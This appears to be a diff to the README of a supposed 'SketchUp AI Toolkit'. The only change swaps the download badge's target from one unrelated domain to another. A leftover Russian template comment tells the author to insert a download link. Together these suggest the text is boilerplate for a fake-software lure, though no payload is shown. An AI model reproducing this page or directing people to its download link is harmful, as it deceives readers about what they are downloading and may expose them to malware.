@@ -5,7 +5,7 @@ Welcome to the **next evolution** in 3D modeling. This advanced **SketchUp AI To
 Created for both **beginner modelers** and **seasoned professionals**, this toolkit offers a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания toolkit (например, https://example.com/download) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download AI Toolkit](https://img.shields.io/badge/Download-SketchUp_AI_Toolkit-purple)](https://cea-groupe.com)
+[![Download AI Toolkit](https://img.shields.io/badge/Download-SketchUp_AI_Toolkit-purple)](https://glocktober.com)
 
 ---
 
